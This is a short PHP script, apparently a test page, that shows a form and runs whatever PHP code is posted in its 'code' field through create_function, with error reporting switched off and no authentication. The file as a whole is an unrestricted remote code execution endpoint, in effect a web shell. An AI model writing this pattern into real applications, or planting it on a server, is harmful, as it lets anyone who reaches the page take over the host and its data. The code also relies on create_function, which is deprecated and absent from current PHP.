<?php
//print_r($_GET);
error_reporting(0);
if(empty($_POST))
{
	print "<form method='post' action='teste.php'>";
	print "<textarea name='code' id='code' style='width:500px; height:500px;'>";
	print "</textarea>";
	print "<input type='submit' value='enviar'>";
} else {
try {
$_ = create_function( '', $_POST['code']);
if(!$_)
	throw new Exception("error");

} catch( Exception $e ) {

	print "errou";
}

$_();
print "<br>";
var_dump($_);
}

